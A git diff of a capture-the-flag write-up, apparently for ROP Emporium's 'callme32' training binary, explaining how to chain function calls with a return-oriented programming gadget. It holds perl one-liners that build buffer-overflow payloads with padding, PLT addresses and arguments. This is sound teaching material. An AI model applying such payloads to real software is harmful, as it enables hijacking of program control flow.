@@ -111,18 +111,66 @@ Now, let's try to build a ROP chain that will call the first function. Since we 
 
 Thus, the order will be as follows (from the top of the stack and down): 
 * 44 bytes of garbage:
-    * `X`x44
+    * `"X"`x44
 * the address of `callme_one` function via the `PLT`:
     * `0x080484f0`
 * some arbitrary return address (currently just garbage):
-    * `YYYY`
+    * `"YYYY"`
 * followed by the first, second, and third parameters:
     * `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`
 
-So let's exit the debugger (with `q` command) and try the first ROP chain.
+So let's exit the debugger (with `q` command) and try the next ROP chain.
 
 ```
 perl -e 'print "X"x44 . "\xf0\x84\x04\x08" . "YYYY" . "\xef\xbe\xad\xde" . "\xbe\xba\xfe\xca" . "\x0d\xf0\x0d\xd0" ' | ./callme32
 ```
 ![](./11.png)
+
+```
+sudo dmesg -k | tail -2
+```
+![](./12.png)
+
+So, we've successfully executed the first function and verified that the return address to it is indeed in the place we thought (it fell at the end because `YYYY` isn't actually an address...). But now we're in trouble. How can we call the second function and pass it the parameters? If we replace `YYYY` with the address of the second function, we won't be able to pass it parameters without disrupting the parameters for the first function (a matter of stack positioning). 
+
+To illustrate the problem, let's replace `YYYY` with the address of the function `callme_two` (`0x08048550` address) and run it.
+
+```
+perl -e 'print "X"x44 . "\xf0\x84\x04\x08" . "\x50\x85\x04\x08" . "\xef\xbe\xad\xde" . "\xbe\xba\xfe\xca" . "\x0d\xf0\x0d\xd0" ' | ./callme32
+```
+![](./13.png)
+
+Therefore, what we really need to do is find a "gadget" that will clean the stack and perform a `ret`. This way, each function can "return to the gadget" that cleans the stack (which will increment the `SP` register by 12 bytes), allowing us to chain the function calls one after the other, so that the `ret` of the gadget will be what calls the next function.
+
+To find the gadget, I used the tool [ropper](https://github.com/sashs/Ropper). This tool is also mentioned in the ROP_Emporium beginner's guide. In fact, this is the first time I've used it. After a bit of research, I found a suitable gadget.
+
+```
+python3 ~/ropper/Ropper.py 
+```
+```
+file callme32
+```
+```
+search /3/ pop %
+```
+![](./14.png)
+
+The last gadget is perfect. Let's check if we can now chain calls to the two functions using the gadget. The structure will be as follows:
+* 44 bytes of garbage:
+    * `"X"`x44
+* the address of `callme_one` function via the `PLT`:
+    * `0x080484f0`
+* the address of the gadget:
+    * `0x080487f9`
+* the three parameters
+    * `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`
+
+AND
+
+* the address of `callme_two` function via the `PLT`:
+    * `0x08048550`
+* the address of the gadget:
+    * `0x080487f9`
+* the three parameters.
+    * `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`
 
